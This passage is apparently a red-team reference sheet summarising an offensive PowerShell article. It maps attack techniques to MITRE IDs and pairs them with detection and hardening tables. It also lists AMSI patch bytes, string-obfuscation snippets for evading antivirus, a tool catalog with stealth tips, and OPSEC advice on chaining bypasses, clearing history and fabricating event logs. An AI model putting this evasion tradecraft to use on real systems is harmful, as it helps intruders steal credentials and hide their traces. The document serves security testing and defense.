| Weaponization | HTA File | T1218.005 | Defense Evasion |
| Weaponization | Office Macro | T1204.002 | Execution |
| Weaponization | LNK File | T1547.009 | Persistence |
| Initial Access | ClickFix (Fake CAPTCHA) | T1566.002 | Initial Access |
| Initial Access | FileFix (Explorer address bar) | T1059.001 | Execution |
| Recon | PowerView | T1087.002 | Discovery |
| Recon | BloodHound/SharpHound | T1087.002 | Discovery |
| Lateral Movement | PowerShell Remoting | T1021.006 | Lateral Movement |
| Lateral Movement | WMI Remote Execution | T1047 | Lateral Movement |
| Execution | In-Memory Assembly Loading | T1620 | Defense Evasion |
| Credential Access | LSASS Dump (reflection) | T1003.001 | Credential Access |
| Credential Access | Invoke-Mimikatz | T1003.001 | Credential Access |
| Privilege Escalation | PowerUp | T1068 | Privilege Escalation |
| Defense Evasion | ScriptBlock Logging Smuggling | T1562.002 | Defense Evasion |
| Defense Evasion | ETW Bypass (hooking) | T1562.001 | Defense Evasion |
| Defense Evasion | .NET Profiler API (Invisi-Shell) | T1562.001 | Defense Evasion |
| Covering Tracks | History Manipulation | T1070.003 | Defense Evasion |
| Covering Tracks | Event Log Fabrication | T1070.001 | Defense Evasion |

---
## Detection & Defensive Countermeasures

### Per-Phase Detection Strategy

| Phase | What to Detect | Detection Method |
|-------|--------------|------------------|
| **AMSI Bypass** | v2 engine load, reflection patterns | Monitor `PowerShell -Version 2`, `System.Management.Automation.AmsiUtils` access |
| **AMSI Bypass** | Memory patch (AmsiScanBuffer) | EDR memory scanning for `B8 57 00 07 80 C3` patch bytes |
| **Initial Access** | ClickFix clipboard writes | Browser EDR monitoring `navigator.clipboard.writeText()` patterns |
| **Initial Access** | RunMRU modification | Registry monitoring on `HKCU\...\Explorer\RunMRU` |
| **Recon** | PowerView cmdlets | AMSI signatures for `Get-NetUser`, `Get-NetComputer`, `Find-LocalAdminAccess` |
| **Recon** | SharpHound collection | Network monitoring for LDAP queries; process monitoring for `SharpHound.exe` |
| **Lateral Movement** | PS Remoting | Event ID 4648 (logon with explicit credentials), WinRM service logs |
| **Lateral Movement** | WMI execution | Event ID 4648, WMI activity logs, `WmiPrvSE.exe` child process monitoring |
| **Assembly Loading** | `Assembly.Load()` in PowerShell | ScriptBlock logging (if not bypassed), memory scanning |
| **Credential Dump** | LSASS handle access | Event ID 4656 (handle requested), Sysmon Event ID 10 (process access) |
| **Credential Dump** | MiniDumpWriteDump API call | API monitoring/EDR syscall hooks |
| **Log Evasion** | `cachedGroupPolicySettings` modification | EDR monitoring for reflection into SMA internals |
| **Log Evasion** | ETW patch (0xC3 in ntdll) | Memory integrity monitoring, EDR ntdll.dll scan |
| **Log Evasion** | .NET Profiler registry writes | Registry monitoring for `COR_PROFILER` and CLSID registry additions |
| **Covering Tracks** | History file deletion | File integrity monitoring on PSReadLine history path |
| **Covering Tracks** | Event log fabrication | Event log consistency checking, SIEM anomaly detection |

### Hardening Recommendations

| Control | Implementation | Priority |
|---------|---------------|----------|
| **Enable CLM** | GPO: Constrained Language Mode for non-admin users | HIGH |
| **Enable Script Block Logging** | GPO: `EnableScriptBlockLogging = 1` (all hosts) | HIGH |
| **Enable AMSI** | Ensure AMSI is active and not disabled | HIGH |
| **Deploy Sysmon** | Configure process creation, network connections, file creation, registry writes | HIGH |
| **PowerShell v2 Removal** | Uninstall Windows PowerShell v2 engine | MEDIUM |
| **ETW Monitoring** | Forward PowerShell ETW events to SIEM | MEDIUM |
| **Transcription Logging** | GPO: Enable module logging + transcription | MEDIUM |
| **WinRM Hardening** | Restrict WinRM endpoints, require Kerberos | MEDIUM |
| **LSASS Protection** | Enable LSA Protection (RunAsPPL), Credential Guard | HIGH |
| **EDR Deployment** | Modern EDR with behavioral analytics (not just signatures) | HIGH |
| **Registry Monitoring** | Monitor RunMRU, COR_PROFILER, CLSID additions | MEDIUM |
| **Network Segmentation** | Restrict lateral movement paths (SMB, WinRM, WMI) | MEDIUM |

---

## Tool Reference Catalog

| Tool | Category | Purpose | Stealth Notes |
|------|----------|---------|--------------|
| **PowerView** | Recon | AD enumeration via PowerShell | AMSI-flagged; obfuscate required |
| **BloodHound/SharpHound** | Recon | AD attack path mapping | Use `--stealth --nosavecache` |
| **Empire** | Post-Exploit | Agent/listener/framework | Web GUI available |
| **Invoke-Mimikatz** | Credential Access | LSASS credential extraction | AMSI-flagged; modify names/variables |
| **Seatbelt** | Recon/Post-Exploit | .NET assembly for system enumeration | Load in-memory via reflection |
| **PowerUp** | Privilege Escalation | Misconfiguration enumeration | Obfuscate before use |
| **winPeas** | Privilege Escalation | Windows privesc checks | Obfuscate before use |
| **PrivescCheck** | Privilege Escalation | Alternative privesc checker | Obfuscate before use |
| **NetLoader** | Loading | Custom binary loader base | Combine with Codecepticon + ConfuserEx |
| **Codecepticon** | Obfuscation | Source code obfuscation | Pre-compilation |
| **ConfuserEx 2** | Obfuscation | Binary obfuscation | Post-compilation |
| **Invoke-Obfuscation** | Obfuscation | PowerShell script obfuscation | Layered/combined techniques |
| **amsi-trigger** | Detection Testing | Identify AMSI-flagged strings | Iterative testing tool |
| **Invisi-Shell** | Log Evasion | .NET Profiler API hooking | Registry + env var setup required |
| **BackdoorLNK** | Persistence | LNK file backdooring | Stores payload in registry |

---

## Obfuscation Technique Quick Reference

### String Obfuscation (Anti-AMSI)

| Technique | Pattern | Best For |
|-----------|---------|----------|
| String Reversal | `$rev[-1..-($rev.Length)] -join ''` | Single cmdlet names |
| Char Array Join | `@('I','n','v',...) -join ''` | Multi-part commands |
| Concatenation | `$a + $b + $c` | Variable assembly |
| Backtick Escaping | `"I\`n\`v\`o\`k\`e"` | Simple strings |
| Base64/Unicode | `[Convert]::FromBase64String()` | Long payloads |
| Format-String | `"{0}{1}" -f $a, $b` | .NET format integration |
| Cmdlet Substring | `(Get-Alias iex).Definition` | Alias dissection |
| HTML Entity Decode | `[Web.HttpUtility]::HtmlDecode()` | HTA-embedded payloads |

### Function Name Obfuscation (Anti-AMSI)

| Technique | Example |
|-----------|---------|
| Char array join | `[String]::Join('',[Char[]](110,97,118))` → `"nav"` |
| Format string | `"{1}{0}" -f 'er','Us'` → `"User"` |
| Variable interpolation | `$x = 'Get'; & "$x-Process"` |

### Variable Name Obfuscation

| Technique | Example |
|-----------|---------|
| Random casing | `$xQ5M`, `$AaBbCc` |
| Get-Variable abuse | `(Get-Variable xQ5M).Value` |
| Get-Command wildcard | `& (GCM *ke-*pr*)` → `Invoke-Expression` |

---

## Operational Considerations

### 2026 Reality Check

| Technique | 2026 Status | Notes |
|-----------|-----------|-------|
| AMSI Memory Patching | ⚠️ Increasingly detected | Modern EDRs catch patch bytes in memory |
| AMSI v2 Downgrade | ⚠️ Blocked by CLM | Does not work when Constrained Language Mode enforced |
| Reflection AMSI Bypass | ⚠️ Signature-flagged | Public scripts detected; must obfuscate the bypass itself |
| String Obfuscation | ✅ Still effective | Layered/combined techniques remain viable |
| ClickFix | ✅ Effective | Relies on user action; social engineering remains strong |
| ScriptBlock Smuggling | ✅ Effective | Very difficult to detect via log analysis |
| ETW Hooking | ⚠️ Detected by advanced EDR | ntdll.dll memory scanning catches 0xC3 patch |
| Invisi-Shell | ✅ Effective with setup | Requires registry writes + DLL deployment |
| Event Log Fabrication | ✅ Effective | Defenders rarely verify log authenticity |

### OPSEC Best Practices

1. **Chain bypasses:** Never rely on a single bypass. Combine AMSI bypass + ScriptBlock logging bypass + ETW bypass.
2. **Obfuscate the obfuscation:** Public bypass scripts are signature-flagged. Apply string kung-fu to the bypass itself.
3. **Memory over disk:** Prefer `Assembly.Load()` over file drops. Every disk artifact is a detection opportunity.
4. **Clean as you go:** Modify RunMRU, clear history, fabricate logs during the engagement — not just at the end.
5. **Avoid Domain Controllers:** For SharpHound collection, use `--excludedomaincontrollers --stealth`.
6. **Test before deploying:** Use `amsi-trigger` to iteratively identify flagged strings before execution.
7. **Custom > Public:** Modified/obfuscated private tools outlive public scripts. Invest in custom loaders.
8. **Minimize dwell time:** Execute recon → cred access → lateral movement → objective in efficient sequence.

---

## Document Metadata

| Field | Value |
|------|-------|
| **Source Article** | "Offensive PowerShell for Red Teamer with Defense Evasion Techniques" |
| **Author** | Maland (screetsec.com) |
| **Published** | June 14, 2026 |
| **Read Time** | ~55 minutes |
| **Word Count** | ~10,944 |
| **Reference Document Created** | 2026-07-12 |
| **Classification** | FOR AUTHORIZED SECURITY TESTING ONLY |
| **Analysis Depth** | Full kill chain, all 13 phases, MITRE-mapped |

---

*End of reference document.*